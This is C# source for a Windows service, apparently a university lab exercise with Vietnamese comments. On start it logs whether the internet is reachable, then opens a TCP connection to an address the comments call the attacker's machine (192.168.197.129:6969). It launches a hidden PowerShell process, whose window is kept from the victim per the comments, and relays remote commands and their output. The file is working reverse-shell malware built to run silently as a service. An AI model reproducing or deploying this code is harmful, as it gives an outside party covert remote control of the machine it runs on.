using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Net;

namespace Lab1_bt3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;)
        static StreamWriter writer;
        static TcpClient client;
        static Stream stream;
        static StreamReader reader;

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            //Kiểm tra kết nối internet
            if (CheckForInternetConnection() == true) // Nếu có kết nối internet
            {
                // Ghi ra log
                WriteToFile("Internet is connected " + DateTime.Now);
                timer.Interval = 5000; //number in milisecinds
                timer.Enabled = true;
            }
            else // Nếu không có kết nối internet
            {
                //Ghi ra log
                WriteToFile("Internet is not connected " + DateTime.Now);
                timer.Interval = 5000; // milisecinds
                timer.Enabled = true;
            }
            //
            // Gọi hàm ReverseShell
            ReverseShell();
            
        }

        protected override void OnStop()
        {
        }

        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        public static bool CheckForInternetConnection()
        {
            try
            {
                // Kiểm tra internet bằng http
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch
            {
                return false;
            }
        }

        private static void ReverseShell()
        {
            // Khởi tạo kết nối tới máy attacker
            using (client = new TcpClient("192.168.197.129", 6969))
            {
                using (stream = client.GetStream())
                {
                    using (reader = new StreamReader(stream))
                    {
                        using (writer = new StreamWriter(stream))
                        {
                            // Khởi tạo tiến trình mở powershell
                            Process p = new Process();
                            p.StartInfo.FileName = "powershell.exe";
                            // Không hiển thị cửa sổ để nạn nhân không phát hiện
                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            // Chuyển hướng stream io sang manual
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            // Gửi thông báo output tới attacker
                            p.OutputDataReceived += new DataReceivedEventHandler(OutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            p.BeginErrorReadLine();

                            StringBuilder input = new StringBuilder();
                            // Nhận input từ attacker, chạy lệnh trên pơershell
                            while (true)
                            {
                                input.Append(reader.ReadLine());
                                p.StandardInput.WriteLine(input);
                                input.Remove(0, input.Length);
                            }
                        }
                    }
                }
            }
        }


        private static void OutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            
            StringBuilder output = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    output.Append(outLine.Data);
                    writer.WriteLine(output);
                    writer.Flush();
                }
                catch (Exception) { }
            }
        }

    }
}
